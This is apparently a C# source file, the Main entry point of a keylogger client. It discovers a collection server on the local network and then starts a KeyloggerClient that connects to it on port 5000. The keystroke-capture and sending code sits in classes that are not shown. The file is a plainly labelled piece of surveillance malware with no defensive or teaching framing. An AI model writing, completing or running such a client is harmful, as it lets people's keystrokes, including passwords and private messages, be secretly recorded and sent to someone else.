using KeyloggerClient;

/// <summary>
/// Entry point for the keylogger client application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger client.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        // Attempt to discover the server IP on the local network
        string serverIp = await ServerDiscovery.DiscoverServerAsync();

        if (serverIp != null)
        {
            Console.WriteLine("Discovered server at: " + serverIp);

            var keyloggerClient = new KeyloggerClient.KeyloggerClient();

            // Start the keylogger client and connect to discovered server
            await keyloggerClient.StartAsync(host: serverIp, port: 5000);
        }
        else
        {
            Console.WriteLine("Server not found on local network.");
        }
    }
}
